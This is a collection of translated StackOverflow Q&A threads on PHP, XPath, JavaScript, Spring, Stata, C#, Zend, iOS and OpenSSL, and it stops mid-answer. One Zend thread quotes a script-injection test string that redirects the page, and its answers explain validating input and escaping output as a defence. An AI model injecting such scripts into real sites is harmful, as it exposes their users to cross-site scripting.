# StackOverflow 问答 12659000-12659999

# php - 抓取上一个/下一个节点的特定部分

> ID：12659004
> 
> 赞同：0
> 
> 时间：2012-09-30T05:50:47.850
> 
> 标签：php, xpath, simplexml

我正在使用 SimpleXML 循环遍历 XML 文件，并尝试每次从 Previous 和 Next 节点中提取特定的数据（特别是***series->displayname属性）。***

**以下是 XML 结构的示例：**

```
<comic>
      <id>117</id>
      <index>1</index>
      <mainsection>
        <pagecount>33</pagecount>
        <series>
          <displayname>Amazing Story</displayname>
          <sortname>Amazing Story</sortname>
        </series>
      </mainsection>
</comic>
<comic>
      <id>102</id>
      <index>1</index>
      <mainsection>
        <pagecount>33</pagecount>
        <series>
          <displayname>Fantastic Tale</displayname>
          <sortname>Fantastic Tale</sortname>
        </series>
      </mainsection>
</comic>
<comic>
      <id>85</id>
      <index>1</index>
      <mainsection>
        <pagecount>33</pagecount>
        <series>
          <displayname>The Great Tale</displayname>
          <sortname>The Great Tale</sortname>
        </series>
      </mainsection>
</comic> 
```

**这是我在循环中使用的结构示例：**

```
$prevIssue = $comic->xpath('preceding-sibling::*')->mainsection->series->displayname;
$nextIssue = $comic->xpath('following-sibling::*')->mainsection->series->displayname;

echo '
<li class="issue" id="' . $seriesCat . '">
<h3>' . $comicSeriresName . '</h3>
   <div id="details">
   <span id="publisher">' . $comicPublisher . '</span><br>
    The last series was called "' . $prevIssue . '<br>
    The next series is called "' . $nextIssue . '<br>
   </div>
</li>'; 
```

但是，“nextIssue”和“prevIssue”变量不起作用。他们返回一个空白结果。我究竟做错了什么？

非常感谢任何指导。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T09:17:28.077

试试下面的代码

```
$prevIssue_arr = $comic->xpath('preceding-sibling::*[1]');
$prevIssue = (isset($prevIssue_arr[0])) ? $prevIssue_arr[0]->mainsection->series->displayname : '';
$nextIssue_arr = $comic->xpath('following-sibling::*[1]');
$nextIssue = (isset($nextIssue_arr[0])) ? $nextIssue_arr[0]->mainsection->series->displayname : '';

echo ... 
```

[已编辑]

其他人已经解释了为什么代码不起作用

一种是该`xpath()`方法返回一个 SimpleXMLElement 对象数组。如果没有找到匹配的节点，则返回一个空数组。

另一个是没有谓词`[1]`或`[position()=1]`在位置路径中，`comic`将返回所有前面或后面的节点。

或者，您可以使用位置路径从紧接的同级`'following-sibling::comic[1]/mainsection/series'`中获取所需的节点。`series`如果有多个`series`节点，则必须给出位置，否则将返回所有节点。

所以使用这个位置路径

```
$prevIssue_arr = $comic->xpath('preceding-sibling::comic[1]/mainsection/series');
$prevIssue = (isset($prevIssue_arr[0])) ? $prevIssue_arr[0]->displayname : '';
$nextIssue_arr = $comic->xpath('following-sibling::comic[1]/mainsection/series');
$nextIssue = (isset($nextIssue_arr[0])) ? $nextIssue_arr[0]->displayname : ''; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T14:11:12.343

问题在这里：

```
preceding-sibling::* 
```

选择*所有*前面的兄弟元素。

```
following-sibling::* 
```

选择*所有*以下同级元素。

**您只需要一个 - 直接在前的兄弟姐妹或直接跟随的兄弟姐妹 - 分别**：

```
preceding-sibling::*[1] 
```

**和**：

```
following-sibling::*[1] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T14:22:53.830

正如其他答案所触及但未明确解释的那样，部分问题在于，与对 SimpleXML 对象的大多数操作不同，它`->xpath()`返回一个**数组**，而不是另一个 SimpleXML 对象。（这大概是为了避免 SimpleXML 对象包含整个文档中完全不相关的节点。）

因此，这一行将失败，因为您将数组视为对象：

```
$prevIssue = $comic->xpath('preceding-sibling::*')->mainsection->series->displayname; 
```

在 PHP 5.4 中，以下是有效的语法（在数组返回后立即对数组进行索引）：

```
$prevIssue = $comic->xpath('preceding-sibling::*')[0]->mainsection->series->displayname; 
```

但是对于早期版本的 PHP，或者如果 XPath 有时可能返回 0 结果，则需要一个中间变量：

```
$prevSiblings = $comic->xpath('preceding-sibling::*');
$prevIssue = (
    ( count($prevSiblings) > 0 )
    ? $prevSiblings[0]->mainsection->series->displayname
    : NULL
); 
```

# php - php 查询刚刚插入的数据...本身

> ID：12659005
> 
> 赞同：-1
> 
> 时间：2012-09-30T05:50:53.077
> 
> 标签：php

我不知道如何命名这个......但无论如何，

在我的脚本中，如果数据不存在，我会在数据库中插入一个新行，然后再次检查该行，例如：

```
1 search the db

2 if nothing
    include(create.php) -> create entry

3 search the db for that row 
```

我是否必须在数据库上的 the 和 next 搜索`usleep(1000000);`之间放置一个？`include`还是我缺少什么？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T06:27:51.310

说真的，为什么还要`create.php`以这种方式使用呢？在页面顶部包含`create.php`，将所有插入语法放入一个函数中，稍后在主脚本中调用它。那会奏效。

或者甚至更好，甚至不打扰包括它。只需在主页中直接运行查询即可。这样，如果您需要更改某些内容，就不必影响其他页面。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T05:57:01.477

你可以使用类似的东西

```
$query="Select * from table where id='23'";
$result=mysql_query($query);

if(mysql_num_rows($result)>0){
//result find in sql table
}else{

$query1="INSERT INTO table (schema) values(values)";
$result=mysql_query($query1);
}

sleep(1);

$query="select *...." 
```

您也可以使用mysql`INTERVAL`查询。它会在特定时间间隔后自动进行查询并搜索数据。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T06:00:54.040

在您的 php 脚本顶部包含文件 create.php 并在此块中调用您需要的函数

```
if ($number_of_rows < 1) { //call the functions from create.php you need here} 
```

# parameters - 具有多个参数的 Spring 集成网关方法

> ID：12659008
> 
> 赞同：4
> 
> 时间：2012-09-30T05:51:25.900
> 
> 标签：parameters, spring-integration, gateway

我对网关和多个参数有疑问：

**上下文：** 我希望网关有两种方法：

```
search(Query query, FetchSpec fetchSpec);
search(int queryId, FetchSpec fetchSpec); 
```

第一种方法应该直接路由到执行查询的服务，而第二种方法应该路由到另一个服务以将 queryId 解析为一个查询，然后转到第一个服务以执行查询。

**问题**：将两个（或更多）参数作为网关方法的参数的最佳实践是什么？似乎整个模式的目标是只有一个参数对应一个消息。我应该使用消息头来添加额外的参数吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-30T06:35:52.847

我想问这个问题是在迫使我思考这个问题。

我的问题的答案是这样的：

网关将 ONE 参数作为有效负载 - 其余参数转到具有自定义名称的标题字段。所以就我而言，我会这样做：

```
@Gateway (requestChannel = "incomingAdhocQuery")
public ResultSet search(@Payload Query query, @Header("fetchSpec") FetchSpec fetchSpec);

@Gateway (requestChannel = "incomingPersistedQuery")
public ResultSet search(@Payload int queryId, @Header("fetchSpec") FetchSpec fetchSpec); 
```

我定义了哪些参数是有效负载，哪些是标头。然后每个方法将其消息引导到特定的通道以进行服务激活。

在配置中，我这样定义我的网关：

```
<int:gateway service-interface="my.company.search.Search" /> 
```

然后我为每种网关方法使用一个特定配置激活搜索服务：

```
<bean id="myManager" class="my.company.search.MyManager"/>
<int:service-activator input-channel="incomingAdhocQuery"  expression="@myManager.fetchByQuery(payload, headers['fetchSpec'])"/>
<int:service-activator input-channel="incomingPersistedQuery" expression="@myManager.fetchById(payload, headers['fetchSpec'])"/> 
```

这样，我设计我的经理是这样的：

```
public ResultSet fetchById(int queryId, FetchSpec fetchSpec) {...}

public ResultSet fetchByQuery(Query query, FetchSpec fetchSpec) {...} 
```

我发现这个解决方案非常优雅，因为我的服务中不需要对 Spring 有任何依赖。只有网关需要这种依赖。接线全部在弹簧配置中完成。我想我爱上了 spring-integration :-D

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-06-13T09:09:08.853

您可以在网关端使用以下内容：

```
@Payload("T(java.util.Arrays).asList(#args[0],#args[1])")
search(Query query, FetchSpec fetchSpec); 
```

如果假设它是相同的签名，则在服务激活器上：

```
@ServiceActivator(inputChannel = "request", outputChannel = "reply")
search(@Payload("#this[0]")  Query query, @Payload("#this[1]") FetchSpec fetchSpec) 
```

# javascript - 评论在所有主要环境中都是 100% 安全的吗？

> ID：12659020
> 
> 赞同：5
> 
> 时间：2012-09-30T05:53:42.103
> 
> 标签：javascript, syntax, comments

注释是在解析之前从源代码中直接删除，还是可以算作换行符并在某些情况下破坏连续性？

```
'foo'.replace(/f/, 'b') //f->b
     .replace(/o/, 'a') //o->a
     .replace(/o/, 'r') /*o->r*/ ;

'foo'.replace(/x/, /*matches "x"*/ 'y');

var foo = ( true !== false ) ? // bikeshed
          'bar' : /*if they're equal, which they won't be, we'll want 'baz'*/ 'baz'; 
```

你知道，因为他们说空格是“安全的”和“微不足道的”或其他什么，但我们都知道有例外。评论*真的*安全吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-30T05:55:52.167

它们在解析过程中被忽略，如果*在*解析之前它们被剥离，解析器将需要扫描输入两次。

> 但是，行尾的 LineTerminator 不被认为是单行注释的一部分；它被词汇文法单独识别，并成为句法文法输入元素流的一部分。这一点很重要，因为它暗示了单行注释的有无不影响自动分号插入的过程

[ES5 规范的评论](http://es5.github.com/#x7.4)。

源代码被标记化，就好像评论不存在一样。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-30T05:55:47.233

是的，评论是安全的。

（话虽如此，我已经看到一些损坏的服务器端 HTML 缩小器，它们不知道内联 JavaScript 是什么，并删除了所有换行符。以`//`注释整个脚本开头的注释。）

# date - 统计——日期转换

> ID：12659028
> 
> 赞同：1
> 
> 时间：2012-09-30T05:54:57.017
> 
> 标签：date, stata

我在 CSV 中有日期，这是我第一次遇到这个问题，当将日期从 CSV 转换为 Stata 时，我得到了缺失值。我通常使用：

我有一个来自 Excel 的变量“xdate”

gen stata_date = date(xdate, "mdy")

这通常有效，但对于这个数据集，我得到了所有缺失值。

在 Excel 中，格式类别为日期，类型为 *3/14/2001。奇怪的是，当我将格式更改为自定义 mm/dd/yyyy（当我现在转到自定义时，它在 m/d/yyyy 上）然后重新运行我的 .DO 日期翻译完美，但是当我重新启动 Stata 并运行 .如果没有此手动更改，我会得到所有缺失值。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T00:04:12.013

补充：2012-10-13——另一个Stata用户指出date()函数中的“mdy”应该是“MDY”。

如果修复此错误不能解决问题，请检查 CSV 文件以找出您提供给 Stata 的内容：

```
clear
set obs 1
gen xdate = "3/14/2001"

split xdate, p("/") 
```

• -split- 如果字符串日期中有除“/”以外的任何非数字字符，将报错。要查看它们是什么，我推荐 Nick Cox 的 -charlist- 命令（来自 SSC）。

• xdate1、xdate2 和xdate3 应该是月、日和年。您可以使用 -tab- 和 -codebook- 检查它们。修复任何错误后，创建日期的万无一失的方法是：

```
gen xmonth = real(xdate1)
gen xday = real(xdate2)
gen xyear = real(xdate3)
gen newdate=mdy(xmonth,xday,xyear) 
```

# javascript - 将事件处理程序附加到 DOM 元素

> ID：12659030
> 
> 赞同：0
> 
> 时间：2012-09-30T05:55:41.917
> 
> 标签：javascript, html

我正在开发一款井字游戏，几乎完成了。我唯一想知道的是是否可以`onclick`从我的 .js 文件中添加事件处理程序，而不是直接从 HTML 属性调用它。这是使用的 HTML 位`onclick`：

```
<div id="left">
        <div id="board">
            <div id="one" onclick="playerMove(this)">

            </div>
            <div id="two" onclick="playerMove(this)">

            </div>
            <div id="three" onclick="playerMove(this)">

            </div>
            <div id="four" onclick="playerMove(this)">

            </div>
            <div id="five" onclick="playerMove(this)">

            </div>
            <div id="six" onclick="playerMove(this)">

            </div>
            <div id="seven" onclick="playerMove(this)">

            </div>
            <div id="eight" onclick="playerMove(this)">

            </div>
            <div id="nine" onclick="playerMove(this)">

            </div>
        </div>
    </div> 
```

对此事的任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T05:59:15.767

如果你使用 jQuery，这样的东西应该可以工作：

```
$(document).ready(function() {
  $('#board div').click(playerMove);
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T06:01:05.463

在纯 javascript（无跨平台库）中，事件处理程序可以通过带有[`addEventListener`](https://developer.mozilla.org/en-US/docs/DOM/element.addEventListener)（现代浏览器）或`attachEvent`（旧版本 IE）的 javascript 代码添加。

这是一个以跨浏览器方式添加事件处理程序的简单函数：

```
// add event cross browser
function addEvent(elem, event, fn) {
    if (elem.addEventListener) {
        elem.addEventListener(event, fn, false);
    } else {
        elem.attachEvent("on" + event, function() {
            // set the this pointer same as addEventListener when fn is called
            return(fn.call(elem, window.event));   
        });
    }
} 
```

示例用法（在页面 DOM 加载后调用）：

```
addEvent(document.getElementById("one"), 'click', playerMove); 
```

或者，要为所有板 div 安装事件处理程序，您可以这样做：

```
var divs = document.getElementById("board").children;
for (var i = 0, len = divs.length; i < len; i++) {
    // element nodes only
    if (divs[i].nodeType === 1) {
        addEvent(divs[i], 'click', playerMove);
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T06:00:55.220

你真的应该考虑为此使用 jQuery。如果您使用的是 jQuery，这将非常简单：

```
$('#board > div').click(playerMove); 
```

如果你想坚持使用 vanilla JS，你可以这样做：

```
var items = document.getElementById('board').children;
for(x in items) {
    items[x].onclick = function() {
        playerMove(items[x]);
    };
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-30T05:58:33.437

尝试：

```
document.getElementById('one').onclick(); 
```

用于在 js 文件中绑定事件处理程序：

```
var board = document.getElementById('board'),
      divs = board.getElementsByTagName('div'),
      i, len = divs.length;
for (i = 0; i < len; i++) {
      divs[i].onclick = function() {
           playerMove(this); 
      };
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-30T06:01:00.857

用这个：

```
document.getElementById('element_id').onclick = function(){ playerMove(this); }; 
```

对于每个 Div，将 'element_id' 更改为 'one'、'two'、...

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-30T06:56:47.223

您的答案在以下 5 行中。试试看 :) 如果有人在新帖子或我的帖子中复制/转换我的代码到 j-query，那是受欢迎的，没有问题。

```
var yourDivID = document.getElementById('your_Div_ID');
yourDivID.addEventListener('click', function (){  playerMove(this); }, false);
function playerMove(divElement)
{
    alert(divElement.id);
} 
```

我试图**[在 jsfiddle.net 上](http://jsfiddle.net/samiciit/EhYY6/#username)**放完整的演示，如果链接不起作用，**您可以单击九个中的任何一个 div 来检查其事件**，然后您可以检查以下代码（适用于我 WIN7 和 FireFox）

```
<html>
<head>
<title> Add Events Dynamically </title>
<script type="text/javascript">
    function add_DivClick_Events() {
        var nodes = document.getElementById('board').childNodes;
        for (var i = 0; i < nodes.length; i++) {
            if (i % 2 == 1) {
                nodes[i].addEventListener('click', function () {
                    playerMove(this);
                }, false);
            }
        }    
    }
    function playerMove(divElement)
    {
        alert(divElement.id);
    }  
    </script>
    <style type="text/css">
    #board div
    {
        width:20px;
        height:20px;
        border:2px solid;        
    }
    </style>
</head>
     <body onload='add_DivClick_Events()'>   
        <div id="left">
        <div id="board">
            <div id="one">

            </div>
            <div id="two">

            </div>
            <div id="three">

            </div>
            <div id="four">

            </div>
            <div id="five">

            </div>
            <div id="six">

            </div>
            <div id="seven">

            </div>
            <div id="eight">

            </div>
            <div id="nine">

            </div>
        </div>
    </div>
    </body>    
 </html> 
```

# c# - 当前上下文中不存在名称“忍者”

> ID：12659033
> 
> 赞同：2
> 
> 时间：2012-09-30T05:56:08.213
> 
> 标签：c#, .net, cucumber

使用以下代码，我得到以下错误： NinjaSteps.cs(16,13): error CS0103: The name 'ninja' does not exist in the current context

我用来编译的命令行是： `csc /target:library /reference:C:\Ruby193\lib\ruby\gems\1.9.1\gems\ cuke4nuke-0.4.0\dotnet\Cuke4Nuke.Framework.dll /reference:C:\Fitnesse\FitNesseRo ot\jediwhale-fitsharp-a78d820\binary\tools\nunit\framework\nunit.framework.dll / reference:C:\Users\Rahul\Documents\Visual~1\Projects\ConsoleApplication3\Console Application3\Ninja.dll NinjaSteps.cs`

我试图编译的代码来自 Cucumber 自动化技术教程：

NinjaSteps.cs：

[http://cuke4ninja.com/sec_ninja_survival_net.html](http://cuke4ninja.com/sec_ninja_survival_net.html)

```
using System;
using System.Collections.Generic;
using System.Text;
using Cuke4Nuke.Framework;
using NUnit.Framework;
using NinjaSurvivalRate;

namespace ConsoleApplication3
{
    class NinjaSteps
    {   [Given(@"^the ninja has a ([a-z]*) level black-belt$")]
        public void TheNinjaHasABlackBelt(String level)
        {   ninja = new Ninja(level);
        }

        [When(@"^attacked by [a\s]*(.*)$")]
        public void AttackedBy(String opponent)
        {
            actions = ninja.AttackedBy(opponent);
        }

        [Then("^the ninja should (.*)$")]
        public void TheNinjaShould(String action)
        {
            Assert.IsTrue(actions.Contains(action));
        }

    }
} 
```

Ninja.cs 如下，编译为 Ninja.dll：

```
using System;
using System.Collections.Generic;
//using System.Linq;
using System.Text;

namespace NinjaSurvivalRate
{
    public class Ninja
    {
        public Ninja(String beltLevel)
        {

        }
        public List<String> AttackedBy(String opponent)
        {
            if ("Chuck Norris" == opponent)
                return new List<string>(
                  new String[] { "run for his life" });
            else
                return new List<string>(
                  new String[] { "engage the opponent" });
        }
    }
} 
```

答案和反馈将不胜感激。通过类似的线程，我发现解决方案取决于具体情况，并且它们不是一致的根本原因，并且觉得我必须详细说明确切的代码细节才能了解原因。您的时间和帮助将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T06:02:49.887

您尚未定义变量`ninja`。你需要：

```
var ninja = new Ninja(level); 
```

对动作做同样的事情。

编辑：

实际上，如果我正确理解您的意图，这两个变量都应该是类本身的字段/属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T06:32:39.240

本教程并没有告诉你整个历史。如果您查看[源代码](https://github.com/davedf/cuke4ninja/blob/master/src/dotnet/NinjaSurvivalRate/src/NinjaSteps.cs)，您将看到实际上`ninja`声明了一个在方法中初始化的字段`TheNinjaHasABlackBelt`（您已经拥有）。

# php - 如何在 Zend 控制器中访问自定义命名视图

> ID：12659035
> 
> 赞同：0
> 
> 时间：2012-09-30T05:56:34.693
> 
> 标签：php, zend-framework2

如何访问自定义命名视图，而不是在 Zend 框架 2.0 中提供相同的方法名称。

例如：

在索引操作“return new ViewModel();”下 将调用 index.phtml 但我想在这里调用另一个视图。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T06:05:40.857

只需使用您想要的视图调用模型视图：

```
 $model = new ViewModel(); 
     $model->setTemplate('edit'); 
     return $model; 
```

更多信息： http: [//framework.zend.com/manual/2.0/en/modules/zend.view.renderer.php-renderer.html](http://framework.zend.com/manual/2.0/en/modules/zend.view.renderer.php-renderer.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T07:01:20.570

在您的控制器中，您可以使用`ViewModel`'`setTemplate`方法来更改将要呈现的脚本：

```
public function someAction()
{
    // do stuff here

    $viewModel = new ViewModel($anArrayOfVariablesForTheView);
    $viewModel->setTemplate('application/view/arbitrary');
    return $viewModel;
} 
```

请注意，您不需要指定`.phtml`.

# php - 如何防止zend形式的脚本标签

> ID：12659039
> 
> 赞同：1
> 
> 时间：2012-09-30T05:57:22.803
> 
> 标签：php, zend-framework, validation, zend-form

您好，我只是在测试我自己开发的应用程序并遇到了问题。我进入了

```
<script>window.location = "http://www.google.com";</script> 
```

在`Zend_Form_Element_Text`元素中。我按下了提交并保存了值。保存值后，我将用户重定向到列表，当它重定向到列表时，脚本标记执行并转到`google.com`.

我的表单元素看起来像

```
 $first_name = new Zend_Form_Element_Text('first_name');
 $first_name->setRequired(true)
            ->addFilter('StringTrim')
            ->addValidator('StringLength', false, array(2, $metaData['first_name']['LENGTH']))
            ->setDecorators(array('ViewHelper', 'errors')); 
```

我想知道如何防止用户输入此类值？是否有任何内置验证或任何其他方式？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T08:02:12.250

测试您的应用程序做得很好，很多人都不会打扰。不要担心将该字符串存储在您的数据库中，它不会造成任何伤害，并且更改它可能会给您带来其他有效条目的问题。正如[vstm 所说](https://stackoverflow.com/questions/12659039/how-to-prevent-script-tags-in-zend-form/12659688#comment17078660_12659039)，使用时将其转义。

但是，当您专门谈论“名字”字段时，您可能可以进行更多验证，例如拒绝任何带有 a`/`的名称。我不知道有任何语言将其作为名称的一部分。如果有，我很想知道它是如何发音的。您也可以在该列表中添加`. = \`和其他一些人，但不要太着迷。

您应该仔细考虑表单中的每个字段，以了解您合理期望接收的输入并相应地验证输入。任何不通过验证的东西都会被拒绝。像这样的字符串`'<script>window.location = "http://www.google.com";</script>'`肯定永远不会通过对期望人名的字段的验证。

就个人而言，我从不过滤输入。它要么通过验证并被接受，要么不通过并被拒绝。我无法通过过滤从错误的输入中做出好的输入，因此它被拒绝并要求用户重新输入他们的数据。例如，使用`StripTags`过滤器

```
<script>window.location = "http://www.google.com";</script> 
```

会给你留下

> window.location = " [http://www.google.com](http://www.google.com) ";

这仍然不是一个有效的名称，应该被拒绝。

您的验证永远不会在 100% 的时间内有效，这就是为什么您应该始终对从用户输入接收到的值进行转义，然后再将它们回显到浏览器。

Zend Framework 有大量的[验证](http://framework.zend.com/manual/1.12/en/zend.validate.set.html)器可供您使用，不要忘记PHP 已经为您提供的[验证器和过滤器。](http://www.php.net/manual/en/book.filter.php)正确使用它们，您将大大降低恶意输入伤害您的应用程序或更重要的是您的用户的风险。

这些验证器和过滤器可供您使用，但 PHP 和 Zend 框架都不知道您期望什么样的数据，因此阅读文档并准确了解它们的工作原理、如何使用它们以及何时使用它们是非常重要的使用它们。

[The Web Application Security Project](https://www.owasp.org/index.php/Cheat_Sheets)有一个极好的资源，每个 Web 开发人员都应该被迫阅读，以致死的痛苦。

**tl;dr**
验证输入和转义输出。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:27:45.820

您可以使用过滤器来限制来自用户的输入。[阅读有关过滤器的信息](http://framework.zend.com/manual/1.12/en/zend.filter.set.html)

Zend 框架中有一个名为[Zend_Filter_StripTags](http://framework.zend.com/manual/1.12/en/zend.filter.set.html#zend.filter.set.striptags)的过滤器，它可以让您选择去除所有或选定的标签。这是网站本身的一个例子。

> ```
> $filter = new Zend_Filter_StripTags();     
> print $filter->filter('<B>My content</B>'); 
> ```
> 
> *结果，您将获得剥离的内容“我的内容”。*

在你的情况下

```
$first_name->setRequired(true)
            ->addFilter('StringTrim')
            ->addFilter('StripTags') //Here a add a filter to strip tags
            ->addValidator('StringLength', false, array(2, $metaData['first_name']['LENGTH']))
            ->setDecorators(array('ViewHelper', 'errors')); 
```

# iphone - 为什么我的 UIButton 没有添加到我的 viewForSectionHeader 的自定义标题视图中

> ID：12659045
> 
> 赞同：0
> 
> 时间：2012-09-30T05:58:42.267
> 
> 标签：iphone, ios, uitableview

我有以下代码可以将按钮添加到我的自定义标题部分。

```
-(UIView*)tableView:(UITableView*)tableView viewForHeaderInSection:(NSInteger)section { 
  if (tableView == menuListTableView) {
      UIView *headerView = [[[UIView alloc] initWithFrame:CGRectMake(0, 0, tableView.bounds.size.width, 40)] autorelease];

    UIButton *headerButton = [UIButton buttonWithType:UIButtonTypeCustom];
    [headerButton setFrame:CGRectMake(0, 0, tableView.bounds.size.width, 40)];
    [headerButton setImage:[UIImage imageNamed:@"Gray_Gradient.png"] forState:UIControlStateSelected];
    [headerButton addTarget:nil action:@selector(toggleOpen:) forControlEvents:UIControlEventTouchUpInside];
    [headerView addSubview:headerButton];

    return headerView;
 }
 return nil;
} 
```

为什么我的按钮没有添加到自定义标题视图中？在调试模式下检查时，headerview 的子视图数组似乎为零。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T06:03:09.637

你看到标题视图本身了吗？检查标题视图的高度。还要检查图像是否存在。如果有疑问，请将按钮类型更改为圆角矩形并查看是否正确添加。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T06:06:22.727

哦，我自己得到了答案！！！我查看了按钮代码。。控件状态设置为 UIControlStateSelected。而不是 UIControlStateNormal。它对我太无知了。打扰各位大佬了！！

# php - 不可能的意外'{'解析错误

> ID：12659049
> 
> 赞同：-4
> 
> 时间：2012-09-30T05:59:19.933
> 
> 标签：php, parse-error

我不确定在大括号、方括号和分号排成一行后，我能读多少次或数一数。这已经折磨了我好几个小时。任何见解将不胜感激。

该程序大部分时间都在工作。当我发布它并且它起作用时，我会看到需要注意的细节。有时对其进行调整会使它崩溃，就像这样。

文本内容无关紧要，因为取出后问题仍然存在。说是第98行。

代码是否正确缩进？我试过了。

```
ini_set ('display_errors', 1);
error_reporting (E_ALL | E_STRICT);

require ('head_metas.htm');
require ('head_menus.htm');

//bid_handler.php

// get items
$title = trim($_POST['title']);
$img = trim($_POST['img']);
$medium = trim($_POST['medium']);
$size = trim($_POST['size']);
$date = trim($_POST['date']);
$value = trim($_POST['value']);

// visitor info
$visitorF = trim($_POST['visitorF']);
$visitorL = trim($_POST['visitorL']);
$phone = trim($_POST['phone']);
$email1 = trim($_POST['email1']);
$email2 = trim($_POST['email2']);
$validation1 = filter_var($email1, FILTER_VALIDATE_EMAIL);
$validation2 = filter_var($email2, FILTER_VALIDATE_EMAIL);

$bid_value = trim($_POST['bid_value']);

// confirmation mails
$headers = '...';
$to = 'my@email.com, $email1';
$subject = '...';
$message = $visitorF . $visitorL . ' has offered ' . $bid_value . ' for ' . $title . '.\n\nContact information:\nPnone: ' . $phone . '\nemail address: ' . $email1;

$okay = TRUE;
// welcome + image
if ($okay == TRUE)
{
    print "
        <p>
         Luring text and a captivating image
             <br />
             All \" quotes \" are meticulously struck
        </p>
          ";
    $okay = TRUE;
}

// inaccessible entries
if ( 
    (empty($visitorF)) || 
    (empty($visitorL)) || 
    (empty($email1)) || 
    (empty($email2)) || 
    ($email1 != $email2) ||
    ($validation1 == NULL) || 
    ($validation2 == NULL) 
    ) 
{
    print " 
        There were errors.
        ";
    $okay = FALSE;
}

    // everything looks great
    elseif ( 
        ($okay == TRUE) &&
        (is_numeric($bid_value)) && 
        ($bid_value >= $value) &&
        (isset($visitorF)) && 
        (isset($visitorL)) && 
        (isset($email1)) && 
        (isset($email2)) && 
        ($email1 == $email2) &&
        ($validation1 == TRUE) &&
        ($validation2 == TRUE) 
        ) 
    {
        print "
            <p>
              Thank you, your information is as follows:
              <br />
              Info... prints the variables in a stylish fashion
             </p> ";
             $okay = FALSE;
    }

        else ( 
            ($bid_value < $value) || 
            (empty($bid_value)) 
            )
        {
            print "
                <p>
                 However, your bid has not met the minimum reserve for this piece.
                <br />
                 Please enter a numeric value and try again.
                </p>
                 ";
            $okay = FALSE;
        }

require ('footer.html');
?> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-30T06:03:56.580

不确定，但我认为问题出在：

```
 else ( 
        ($bid_value < $value) || 
        (empty($bid_value)) 
        ) 
```

关键字`(condition)`后面不能有。`else`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-30T06:15:43.137

**错误输入**

```
 else ( 
        ($bid_value < $value) || 
        (empty($bid_value)) 
        ) 
```

您不能在**else**中使用条件将其替换为**else if**或**删除条件**

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-30T06:30:17.093

```
 else ( 
        ($bid_value < $value) || 
        (empty($bid_value)) 
        )
    { 
```

这是错误您不能在语句中使用条件`else`语句的基本结构`if-else`是

```
if(condition){
     //condition is true
}else{
     //condition is false
} 
```

如果你想使用比使用更多的条件`elseif`

```
if(condition){
//condition is true
}elseif(condition){
//condition is false
}else{
} 
```

您正在使用单个`elseif`语句。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-30T06:08:16.827

看这里：

```
 else ( 
        ($bid_value < $value) || 
        (empty($bid_value)) 
        )
    { 
```

现在让我们把它缩小一点：

```
else (($bid_value < $value) || (empty($bid_value))) { 
```

然后你就很明显地看到了问题。您不只是在`else`语句之​​后有一个条件。PHP 中 else 语句的设计（[有关 else 控制结构，请参见 PHP.net 文档](http://php.net/manual/en/control-structures.else.php)）使其清除了`if`语句的所有可能情况。这使得它不能接受任何条件，因为其他条件不接受的任何东西都会进入`else`语句。

# openssl - openssl RSA 私钥和公钥

> ID：12659050
> 
> 赞同：6
> 
> 时间：2012-09-30T05:59:35.860
> 
> 标签：openssl, rsa

如果我使用 open ssl 命令

```
sudo openssl genrsa -out privkey.pem 2048 
```

要生成 rsa 密钥，它只生成 1 个文件。这是私钥。我如何获得公钥。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-09-30T06:14:22.080

回答您的问题：您生成的文件同时`sudo openssl genrsa -out privkey.pem 2048`包含*private 和 public key*。

`openssl genrsa` [生成一个密钥对](http://en.wikipedia.org/wiki/RSA_%28algorithm%29#Key_generation)。公钥是**模数 (n)**和**公共指数 (e)**：

```
$ openssl genrsa 2048 > dummy.key
$ openssl rsa -in dummy.key -noout -text

Private-Key: (2048 bit)
modulus:
    00:d4:4a:3c:8c:41:b3:9b:a3:26:2d:4b:8c:62:08:
    c0:fc:ad:6c:5e:5f:3f:28:e6:a3:7c:3d:43:5e:98:
    [...]
publicExponent: 65537 (0x10001)
privateExponent:
    00:c7:6e:f6:72:cd:46:6e:70:56:ed:36:8c:2b:8d:
    0d:c0:53:2b:fb:7c:7f:59:6d:53:28:e4:64:e5:f9:
    d6:84:64:7e:e4:be:20:64:7d:5b:50:06:ba:1f:df:
    [...] 
```

您可以使用[openssl rsa的](http://www.openssl.org/docs/apps/rsa.html)[-pubout](http://www.openssl.org/docs/apps/rsa.html#item_pubout)选项仅提取公钥：

```
$ openssl rsa -in dummy.key -pubout
writing RSA key
-----BEGIN PUBLIC KEY-----
